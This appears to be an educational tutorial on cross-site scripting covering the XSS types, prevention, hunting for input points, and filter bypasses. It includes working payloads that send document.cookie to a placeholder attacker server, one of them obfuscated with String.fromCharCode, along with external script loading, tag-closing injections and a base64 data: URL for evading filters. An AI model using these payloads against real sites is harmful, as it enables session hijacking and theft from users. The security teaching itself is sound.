  An XSS vulnerability occurs when attackers can execute custom scripts on a victim’s browser. 

`If an application fails to distinguish between user input and the legitimate code that makes up a web page,attackers can inject their own code into pages viewed by other users.` 


## Mechanisms

As we have said earlier this attack happens when user input is not sanitised and validate the user input.

imagine there is an email input  box in the target  web app where user inputs are not validated or sanitised.

Here we have a scope of XSS attack. 

For example let's test an inline javascript,

```js
<script>location="http://attacker.com";</script>
```

Here attacker can redirect the page to attacker's website.  This is not a great exploit, attacker can do more here.

So in short, XSS happens when attackers can inject scripts in this manner onto a page that another user is viewing.

Even attackers can upload malicious files from another source using the `src` attribute of `<script>` tag 

Example,

```js
<script src= http://attacker.com/xss.js></script>
```

This is not going to work on another user using email input for now.

For that let's consider another example,

Let's say,

The site also allows users to subscribe to the newsletter by visiting the URL : 
``
```js
https://subscribe.example.com?email=SUBSCRIBER_EMAIL

```


After the user visit the url, it will automatically subscribed,

In this case, attackers can inject the script by tricking users into visiting a malicious URL:

```js
https://subscribe.example.com?email=<script>location="http://attacker.com";</script>
```

Since, the script got incorporated into the site, the victims browser will think that it's part of the site. And now the script can access the resources that the browser stores for the site,

Example cookies, session tokens etc.

Here is a script that access cookies, from victim's browser as a url parameter.

```js
<script>image = new Image(); image.src= 'http://attacker_server_ip/?c='+document.cookie;</script>
```

This script means to load an image from attacker's server and use the user's cookie as part of the request.

But if http only flag is set to the cookie then it will not be possible for the attacker to steal the cookie.

Not only that by inspecting attacker's server, attacker can check for the cookie and use it to authenticate as the person or modify his data or even extract personal information.

## Types of XSS

Common types:
- Reflected XSS 
- Stored XSS 
- Dom-Based XSS 

Special type:
- Blind XSS 
- Self XSS 

The difference among these types is that how the payload travels before it reaches the victim.

## Stored XSS 

Stored XSS happens when user input id stored in server and retrieved unsafely.

Here the payload is send to the server from there to database and retrieved when a victim access it. 

In this case,  all the user need to do for to become a victim is that to access the website. 

There is no user interaction required.

Let's take an example with youtube,

Imagine a scenario where we are seeing a youtube video and as we all know there is comment functionality on the page,

Imagine the comment we enter ie, user input is not validated nor sanitised we have a scope to play XXS in here. 

Payload :
```js
<script> alert(2);</script>
```

The payload will go to server and get stored in the database and execute whenever users watch that video.

Here in this case an alert box with a message '2' will be displayed whenever a user watch the video 

This attack is more dangerous because it has a scope to affect millions of users.

## Blind XSS


Blind XSS vulnerability is also a  stored vulnerability. Here payload is stored in the server and executed by another part of the server.

Suppose a site has a forum to contact it's support staff. Here, the input given is not validated nor sanitised in this case we as adversary, can send a message containing our payload to the admin. 

And let admin execute the payload. This is often hard to execute as we can't see the results.


## Reflected XSS 

This a sort of XSS where the payload is send to the server but not stored there, 

But just get it processed by the server and returns to the victim.

The example where we discussed about newsletter subscription is a perfect example of reflected XSS 

`Let's look at another example:`
imagine a scenario  where, Youtube have this vulnerability,


`Normal scenario:`
User search for a string "hacking" , you tube returns  results, also it displays the string we searched for.

`Adversary :`
We found out that the search query is neither validated nor sanitised. So we can inject payloads like,

```js
<script>alert(200);</script>
```

This will display an alert box with message  '200' . 

We can do this to execute this payload at  another user instead of our browser to do this we need to find the query parameter. 

Imagine the query parameter in 'q', the payload will be like,
```js
https://youtube.com/search?q=<script>alert('you are hacked');</script>
```

This will trick the user by displaying an alert box saying "you are hacked". This is harmless code but we can do whatever we need when we can execute javascript.

## Dom-Based XSS

To understand this type of attack  first we need to know what DOM is, 

DOM is a model that is used by browsers to render web pages. 
- It represents a web page's structure 
- It defines the basic properties and behaviour of each html element. 
- It helps javascript to access elements and modify it.

Instead of going through the server this type of attack exploits the local copy of web available on user's browser.

javascript's libraries like jQuery is prone to this sort of attack as they dynamically alters DOM based elements .

So this type of XSS takes in the user input and modifies the source code of the page. 

`Normal scenario:`
There exists a function on web app to display the location of the user.

There is a parameter in the url called location where the value in parameter is displayed on page like,

" Welcome user from India "

And the url for the same will be like,
```query
https://example.com?location=India
```


`Adversary:`
There is a scope for us to inject the payload to the url parameter.

`payload:`
```js
https://example.com?locale=    <script>location='http://attacker_server_ip/?c='+document.cookie;</script>
```

## Self-XSS

This attack requires a lot of social engineering. Here victim have to inject the code into the vulnerable part of the website by themselves.


You might have seen social media posts like "copy and paste this code and do  something cool" this might  probably be a javascript code aimed for self XSS. 

## Prevention


To prevent an XSS an application should implement two controls:
- Robust input validation
- Contextual output escaping and encoding.

To be specific,

Let's say user entered `<script>` in the input. This should never be inserted into html document directly. 

The server should validate that the user input doesn't contains dangerous characters, that might interfere with the program's logic.

- The application could check for the special characters in user input before processing. 

There is method for this called `escaping` where the special characters are `encoded`, so that it won't be interpreted as code, and it will only be taken in it's literal meaning ie, strings.

Application  needs to encode the user input based on where where it will be embedded.

For example if the user input is enter into the script tag, then it need to be encoded in javascript format. The same will be applied to HTML , XML , JSON , CSS etc.

Let's take the case of html document ,

- For example, the < and > brackets should be encoded into HTML characters `&lt` and `&gt` respectively

`< , > , single quotes, double quotes, & , / ,` etc have special  meaning  on html  escaping ensures that browser won't misinterpret these characters  to code.

 Many modern JavaScript frameworks such as `React, Angular 2+,` and `Vue.js` automatically do this,

But in the case of DOM based XSS , we should take a different approach as the payload is not send to server.

As the validations and sanitisation talked earlier is implement  on the server, this won't be effective.

- The developer should implement client side input validation for to defend XSS. 

- The code that rewrite the html document based on user input.

- Http only flag should  be set on cookies.

- Implement content-security-policy http header. This header  restrict how resources such as JavaScript, CSS,
   or images load on your web pages
   
- Instruct the browser for only execute scripts from a list of resources.

## Hunting for XSS

###### Step 1: Look for Input Opportunities


Look for endpoints to submit user input to the target site. 

If you are attempting `stored XSS` then look for:
- Places where input get stored by the server later displayed to the server.
- Comment fields
- User Profiles
- Blog posts, etc.

If you are attempting `Reflected XSS` then look for:
- The types of user input that are most often reflected back to the user.
- Search boxes
- Name field 
- Username field , etc.

Sometimes even dropdown menus, or numeric fields can help us perform XSS, there might not be a way for input directly from browser, but using a proxy like burp might help.

Let's take an example:

Here we have interpreted a traffic that has to be send to the server.

```http
POST /edit_user_age
(Post request body)
age=20
```

Imagine there is an age changing functionality on the web app, what we did on browser was to just click on the age without entering the value, ie , prebuilt numeric values were there on the web app.

And the value of we selected was stored on a parameter called age and send to server using post method.

We can change the value of age parameter to our payload:
```http
POST /edit_user_age
(Post request body)
Age = <script>alert('XSS testing');</script>
```

If you are looking for `DOM based` and `Reflected XSS` then look for input in 
- URL parameters
- Fragments
- Pathnames that get displayed to the user, etc.

When we find a url parameter we should always try to enter a string  and we should check for it in the response page by searching the source code and see where our input goes .


## Step 2: Insert Payloads


###### More Than a `<script>` Tag

Other than inserting javascript using script tag there are several methods for to do it .

Some scripts might be designed to run when a specific condition is met on html attribute 

[Example ]
```js
<img onload=alert('The image has been loaded!') src="example.png">
```

There might be `onclick` attributes, `onerror` etc which is embedded with html tags. 

We can try to enter payloads on such end points, or even we can add a new event attribute to an html tag.

Special URL schemes:

Instead of script tag we can use, 
```js
javascript:alert('XSS by Vickie')
```


There is also a `data:` where we can embed small files into url.

We can also use these to embed javascript code into url like this:
```js
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFZpY2tpZScpPC9zY3JpcHQ+"
```

This will generate an alert box as the base 64 encoded  string is a javascript code for alert box.

We don't actually need base 64 encoding we can just write it like,
```js
data:text/html,<script>alert('test')</script>
```

But base 64 encoding will help bypass XSS filters.

These sort of payloads will be helpful the website allows url inputs from user to it's parameters or sometimes if we find,

```html
<img src="IMAGE_URL"/>
```

We can enter javascript url scheme or data url scheme to trick webpage into loading javascript code.


XSS payload cheat-sheet :
```
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet/
```

## Closing Out HTML Tags

Sometimes we need to be closing  the html tags before our payloads,

Example here is a real image tag:
```html
<img src="USER_INPUT">
```

We need to modify our payload for not get syntax errors like this,

```js
"/><script>location="http://attacker.com";</script>
```

The first `"/>` will close the image tag and allow us to insert payload.

So in total the image tag looks like,
```html
<img src=""/><script>location="http://attacker.com";</script>">
```

If the payload is not working look at the response page to check for syntax  error caused.

Some common payloads:
![Screenshot 2023-10-30 at 2.18.49 PM.png](Screenshot%202023-10-30%20at%202.18.49%E2%80%AFPM.png)


## Bypassing XSS Protection

###### Alternative JavaScript Syntax

Some times `<script>` tag will be blacklisted, in such scenarios...

`scenario:`

```html
<img src="USER_INPUT">
```

Imagine this is the attribute we want to insert payload in, where script tag is blacklisted.

```js
<img src="123" onerror="alert('test');"/>
```
 
Or use special url schemes,
```js
<a href="javascript:alert('test')>Click me!</a>"
```


###### Capitalisation and Encoding


Some times we might be able to bypass  filters by just capitalising or encoding the tags.

Suppose, `<script>` is filtered out. Just by changing it to `<scRIPT>` we might be able to bypass the filter.

Even though the string is modified browser will read it as script tag.

Imagine a scenario where single quotes or double quotes are blocked, so we can't write any string into XSS payload directly.

`Original payload:`
```js
<script>location='http://attacker_server_ip/c= '+document.cookie;</script>
```

`' http://attacker_server_ip/c= '` This part of our payload will be exclude for this we can use fromCharCode() function of javascript.

Which maps numeric codes to ASCII.

`' http://attacker_server_ip/c= '` will be changed to,
```js
String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107,101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61)
```

This will bypass the filter.

`New payload:`
```js
<script>location=String.fromCharCode(104, 116, 116, 112, 58, 47,47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118,101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookie;</script>
```


My webpage to convert string to ASCII character mapping:
```js
https://ashique-thaha.github.io/ascii-character-mapper/
```


There are many ways to bypass filter's logic. for example ,

The filter might be checking for script tag and removing it only once but we can specify two script tags effectively resulting in the payload we want.